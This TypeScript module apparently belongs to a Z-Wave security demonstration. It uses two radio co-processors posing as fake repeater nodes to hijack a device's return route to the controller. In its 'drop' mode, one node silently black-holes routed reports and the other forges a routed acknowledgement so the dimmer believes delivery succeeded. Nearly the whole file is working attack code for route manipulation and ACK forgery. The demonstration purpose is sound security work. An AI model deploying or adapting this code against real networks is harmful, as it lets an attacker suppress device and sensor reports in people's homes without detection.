import { Bytes } from "@zwave-js/shared";
import {
  ProtocolDataRate,
  RssiError,
  RoutedZWaveMPDU,
  type MPDU,
  type RSSI,
} from "@zwave-js/core";
import { TransmitCallbackStatus } from "@zwave-js/serial/rcp";
import { type Outcome } from "../demo/types";
import { hardware, primaryRcpId, type RCPHost } from "./hardware";
import {
  FAKE_REPEATER_NODE_ID,
  MAIN_CONTROLLER_NODE_ID,
  REPEATER_NODE_ID,
  SECOND_FAKE_REPEATER_NODE_ID,
} from "./network";
import { errorMessage } from "./priority-route";
import { rcpCommands, type RcpCommandSpec } from "./rcp-commands";

export type RelayMode = "forward" | "drop";

interface ReturnRouteRelayState {
  active: boolean;
  busy: boolean;
  mode: RelayMode;
  outcome: Outcome;
}

const SECOND_RELAY_RCP_ID = "rcp-2";

export function returnRouteCommandSpec(
  command: "route-via-fakes" | "prioritize-route" | "route-direct",
): RcpCommandSpec {
  const payload = command === "route-via-fakes"
    ? Bytes.from([0x01, 0x14, MAIN_CONTROLLER_NODE_ID, 0x02, SECOND_FAKE_REPEATER_NODE_ID, FAKE_REPEATER_NODE_ID, 0x20])
    : command === "prioritize-route"
      ? Bytes.from([0x01, 0x25, MAIN_CONTROLLER_NODE_ID, 0x00])
      : Bytes.from([0x01, 0x14, MAIN_CONTROLLER_NODE_ID, 0x00, 0x20]);
  const label = command === "route-via-fakes" ? "Installed SUC return route through nodes 004 and 005"
    : command === "prioritize-route" ? "Selected SUC return route slot 0"
      : "Restored direct SUC return route";
  return {
    sourceNodeId: MAIN_CONTROLLER_NODE_ID,
    destinationNodeId: REPEATER_NODE_ID,
    payload,
    label,
  };
}

export function canRelayFrame(mpdu: MPDU, relayNodeId: number): mpdu is RoutedZWaveMPDU {
  const repeaterIndex = mpdu instanceof RoutedZWaveMPDU
    ? mpdu.direction === "outbound" ? mpdu.hop : mpdu.hop - 1
    : -1;
  return mpdu instanceof RoutedZWaveMPDU
    && repeaterIndex >= 0
    && repeaterIndex < mpdu.repeaters.length
    && mpdu.repeaters[repeaterIndex] === relayNodeId
    && ((mpdu.sourceNodeId === REPEATER_NODE_ID && mpdu.destinationNodeId === MAIN_CONTROLLER_NODE_ID)
      || (mpdu.sourceNodeId === MAIN_CONTROLLER_NODE_ID && mpdu.destinationNodeId === REPEATER_NODE_ID));
}

export function shouldForwardRelayFrame(
  mpdu: MPDU,
  relayNodeId: number,
  mode: RelayMode,
): mpdu is RoutedZWaveMPDU {
  if (!canRelayFrame(mpdu, relayNodeId)) return false;
  if (mpdu.direction === "inbound" || mpdu.routedAck || mpdu.routedError) return true;
  if (mode === "forward") return true;
  // Drop mode: RCP-2 (node 005) still relays the report to RCP-1 (node 004),
  // which is the black hole that silently drops it before it reaches the controller.
  return relayNodeId === SECOND_FAKE_REPEATER_NODE_ID;
}

export function forwardRelayFrame(mpdu: RoutedZWaveMPDU, rssi: RSSI) {
  const nextHop = mpdu.hop + (mpdu.direction === "outbound" ? 1 : -1);
  return new RoutedZWaveMPDU({
    homeId: mpdu.homeId,
    sourceNodeId: mpdu.sourceNodeId,
    destinationNodeId: mpdu.destinationNodeId,
    ackRequested: mpdu.direction === "inbound" && nextHop === 0,
    headerType: mpdu.headerType,
    sequenceNumber: mpdu.sequenceNumber,
    payload: mpdu.payload,
    routed: true,
    lowPower: mpdu.lowPower,
    speedModified: mpdu.speedModified,
    beamingInfo: mpdu.beamingInfo,
    direction: mpdu.direction,
    routedAck: mpdu.routedAck,
    routedError: mpdu.routedError,
    ...(mpdu.failedHop === undefined ? {} : { failedHop: mpdu.failedHop }),
    hop: nextHop,
    repeaters: mpdu.repeaters,
    destinationWakeup: mpdu.destinationWakeup,
    destinationWakeupType: mpdu.destinationWakeupType,
    ...((mpdu.routedAck || mpdu.routedError)
      ? { repeaterRSSI: [...(mpdu.repeaterRSSI ?? []), rssi] }
      : {}),
  });
}

export function forgeRoutedAck(mpdu: RoutedZWaveMPDU) {
  return new RoutedZWaveMPDU({
    homeId: mpdu.homeId,
    sourceNodeId: MAIN_CONTROLLER_NODE_ID,
    destinationNodeId: REPEATER_NODE_ID,
    ackRequested: true,
    headerType: mpdu.headerType,
    sequenceNumber: mpdu.sequenceNumber,
    routed: true,
    speedModified: mpdu.speedModified,
    direction: "inbound",
    routedAck: true,
    routedError: false,
    hop: 0,
    repeaters: mpdu.repeaters,
    destinationWakeup: false,
    repeaterRSSI: [
      RssiError.NotAvailable,
      RssiError.NotAvailable,
      RssiError.NotAvailable,
      RssiError.NotAvailable,
    ],
  });
}

class ReturnRouteRelay {
  private listeners = new Set<() => void>();
  private rcp1: RCPHost | undefined;
  private rcp2: RCPHost | undefined;
  private rcp1ReceiveHandler: ((mpdu: MPDU, info: RadioReception) => void) | undefined;
  private rcp2ReceiveHandler: ((mpdu: MPDU, info: RadioReception) => void) | undefined;
  private state: ReturnRouteRelayState = {
    active: false,
    busy: false,
    mode: "forward",
    outcome: { kind: "idle", label: "Route not configured" },
  };

  subscribe = (listener: () => void) => {
    this.listeners.add(listener);
    return () => { this.listeners.delete(listener); };
  };
  getSnapshot = () => this.state;

  private update(change: Partial<ReturnRouteRelayState>) {
    this.state = { ...this.state, ...change };
    for (const listener of this.listeners) listener();
  }

  private attach(rcp1: RCPHost, rcp2: RCPHost) {
    if (this.rcp1 === rcp1 && this.rcp2 === rcp2) return;
    this.detach();
    this.rcp1 = rcp1;
    this.rcp2 = rcp2;
    this.rcp1ReceiveHandler = (mpdu, info) => {
      if (this.state.active && shouldForwardRelayFrame(mpdu, FAKE_REPEATER_NODE_ID, this.state.mode)) {
        void this.forward(rcp1, mpdu, info);
      }
    };
    this.rcp2ReceiveHandler = (mpdu, info) => {
      if (!this.state.active) return;
      if (this.state.mode === "drop"
        && canRelayFrame(mpdu, SECOND_FAKE_REPEATER_NODE_ID)
        && mpdu.direction === "outbound" && !mpdu.routedAck && !mpdu.routedError) {
        void this.relayThenForgeAck(rcp2, rcp1, mpdu, info);
      } else if (shouldForwardRelayFrame(mpdu, SECOND_FAKE_REPEATER_NODE_ID, this.state.mode)) {
        void this.forward(rcp2, mpdu, info);
      }
    };
    rcp1.on("mpdu received", this.rcp1ReceiveHandler);
    rcp2.on("mpdu received", this.rcp2ReceiveHandler);
  }

  private detach() {
    if (this.rcp1 && this.rcp1ReceiveHandler) this.rcp1.off("mpdu received", this.rcp1ReceiveHandler);
    if (this.rcp2 && this.rcp2ReceiveHandler) this.rcp2.off("mpdu received", this.rcp2ReceiveHandler);
    this.rcp1 = undefined;
    this.rcp2 = undefined;
    this.rcp1ReceiveHandler = undefined;
    this.rcp2ReceiveHandler = undefined;
  }

  private async forward(
    rcp: RCPHost,
    mpdu: RoutedZWaveMPDU,
    info: RadioReception,
  ) {
    try {
      const region = await rcp.queryRegion();
      const frame = forwardRelayFrame(mpdu, info.rssi).serialize({
        channel: info.channel,
        protocolDataRate: info.protocolDataRate,
        region: region.region,
      });
      const status = await rcp.transmit(frame, { channel: info.channel, txPower: 0, withCCA: true });
      if (status !== TransmitCallbackStatus.Completed) {
        throw new Error(`RCP relay failed with status ${status}`);
      }
    } catch (error) {
      if (this.state.active) {
        this.update({ outcome: { kind: "error", label: errorMessage(error) } });
      }
    }
  }

  private async relayThenForgeAck(
    relay: RCPHost,
    forger: RCPHost,
    mpdu: RoutedZWaveMPDU,
    info: RadioReception,
  ) {
    // RCP-2 first forwards the report to RCP-1 (the black hole, which drops it),
    // then returns a forged routed ACK so the dimmer believes it was delivered.
    await this.forward(relay, mpdu, info);
    await this.sendForgedRoutedAck(forger, mpdu, info);
  }

  private async sendForgedRoutedAck(rcp: RCPHost, mpdu: RoutedZWaveMPDU, info: RadioReception) {
    try {
      const region = await rcp.queryRegion();
      const frame = forgeRoutedAck(mpdu).serialize({
        channel: info.channel,
        protocolDataRate: info.protocolDataRate,
        region: region.region,
      });
      const status = await rcp.transmit(frame, { channel: info.channel, txPower: 0, withCCA: true });
      if (status !== TransmitCallbackStatus.Completed) {
        throw new Error(`RCP-1 routed acknowledgement failed with status ${status}`);
      }
    } catch (error) {
      if (this.state.active) {
        this.update({ outcome: { kind: "error", label: errorMessage(error) } });
      }
    }
  }

  async setup() {
    if (this.state.busy || this.state.active) return;
    const rcp1 = hardware.getRcpHost(primaryRcpId);
    const rcp2 = hardware.getRcpHost(SECOND_RELAY_RCP_ID);
    if (!rcp1 || !rcp2) {
      this.update({ outcome: { kind: "error", label: "Connect RCP rcp-1 and rcp-2 first" } });
      return;
    }
    this.update({ busy: true, outcome: { kind: "pending", label: "Configuring return route" } });
    try {
      this.attach(rcp1, rcp2);
      await rcpCommands.sendSpec(returnRouteCommandSpec("route-via-fakes"));
      await rcpCommands.sendSpec(returnRouteCommandSpec("prioritize-route"));
      this.update({ active: true, outcome: { kind: "success", label: "Node 003 returns through nodes 005 and 004" } });
    } catch (error) {
      this.detach();
      this.update({ active: false, outcome: { kind: "error", label: errorMessage(error) } });
    } finally {
      this.update({ busy: false });
    }
  }

  async teardown() {
    if (this.state.busy || !this.state.active) return;
    this.update({ busy: true, outcome: { kind: "pending", label: "Removing return route" } });
    try {
      await rcpCommands.sendSpec(returnRouteCommandSpec("route-direct"));
      this.detach();
      this.update({ active: false, outcome: { kind: "success", label: "Direct return route restored" } });
    } catch (error) {
      this.update({ outcome: { kind: "error", label: errorMessage(error) } });
    } finally {
      this.update({ busy: false });
    }
  }

  setMode(mode: RelayMode) {
    this.update({ mode });
  }
}

interface RadioReception {
  channel: number;
  protocolDataRate: ProtocolDataRate;
  rssi: RSSI;
}

export const returnRouteRelay = new ReturnRouteRelay();
